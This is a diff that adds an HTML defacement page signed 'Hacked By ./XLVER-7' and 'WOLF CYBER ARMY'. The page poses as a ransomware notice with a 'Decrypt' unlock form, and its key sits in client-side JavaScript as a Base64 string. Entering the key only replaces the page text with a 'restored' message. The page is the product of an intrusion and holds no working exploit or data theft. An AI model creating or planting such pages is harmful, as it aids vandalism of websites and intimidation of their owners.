@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<link href="css/IMG-20240910-222452-050.jpg" rel="icon" type="image/x-icon"/>
+<meta content="Hacked By ./XLVER-7" name="keywords"/>
+<meta content="WOLF CYBER ARMY" name="description"/>
+<meta content="./XLVER-7 Washere" name="author"/>
+<meta content="#343a40" name="theme-color">
+<title>Hacked By ./XLVER-7</title>
+<link href="css/css" rel="stylesheet" type="text/css"/>
+<link href="css/style-css.css" rel="stylesheet"/>
+<style>
+      body {
+        color: #FFFFFF;
+        font-family: "Kelly Slab", sans-serif;
+        font-weight: 60;
+        height: 100vh;
+        margin: 0;
+        background-color: black;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .container {
+        text-align: center;
+      }
+      .form-container {
+        margin-top: 20px;
+      }
+      .form-container input {
+        padding: 10px;
+        font-size: 16px;
+        margin-right: 10px;
+      }
+      .form-container button {
+        padding: 10px 20px;
+        font-size: 16px;
+        background-color: red;
+        color: white;
+        border: none;
+        cursor: pointer;
+      }
+      .form-container button:hover {
+        background-color: darkred;
+      }
+    </style>
+</meta></head>
+<body>
+<div class="container" id="content">
+<img alt="image host" src="images/IMG-20240910-222452-050.jpg"/>
+<div class="glitch" data-text="Wolf_CyberArmy">
+<font color="white" face="5">
+<font color="red">Hacked By<font color="white"> ./XLVER-7</font></font></font>
+</div>
+<br/>
+<font color="gold" size="6">Tidak Pantas Jika Aku Mendapatkanmu<br/>
+<div class="form-container">
+<form action="" method="post">
+<label>Key : </label>
+<input class="input" name="key" placeholder="Enter unlock key" type="text"/>
+<button onclick="verifyKey()" type="button">Decrypt</button>
+</form>
+</div>
+</font></div>
+<script>
+      const encryptedKey = "eGxpdmVyNw=="; // Encrypted "ransomware" with Base64
+
+      function verifyKey() {
+        const inputKey = document.querySelector('input[name="key"]').value;
+        const decodedKey = atob(encryptedKey); // Decode the Base64 encoded key
+        
+        if (inputKey === decodedKey) {
+          alert("Key is correct! Restoring the original website...");
+
+          // Menghapus semua konten dan menampilkan pesan sukses
+          const content = document.getElementById("content");
+          content.innerHTML = "<div style='text-align:center; color:lime;'><h1>Access Granted</h1><p>Website restored successfully.</p></div>";
+        } else {
+          alert("Wrong key!");
+        }
+      }
+    </script>
+</body>
+</html>
